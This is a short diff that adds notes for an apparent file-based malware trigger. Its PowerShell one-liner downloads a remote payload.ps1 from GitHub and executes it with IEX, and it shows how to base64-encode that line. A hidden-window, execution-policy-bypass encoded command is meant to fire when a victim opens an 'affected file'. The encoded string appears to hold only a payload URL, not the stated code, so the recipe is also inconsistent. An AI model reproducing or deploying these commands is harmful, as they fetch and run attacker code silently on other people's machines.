@@ -1,0 +1,11 @@
+-----> The code:
+
+$u="https://raw.githubusercontent.com/username/repo/main/payload.ps1"; $c=New-Object System.Net.WebClient; IEX $c.DownloadString($u)
+
+-----> converting the code into base64:
+
+echo -n "الكود_هنا" | iconv -t utf16le | base64 -w 0
+
+-----> the trigger we want to execute when opening the affected file:
+
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBZAG8AdQBjAGUAZgAtAEIAZQByAGIAYQBnAHUAZQAvAGUAdABoAGkAYwBhAGwALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQA=
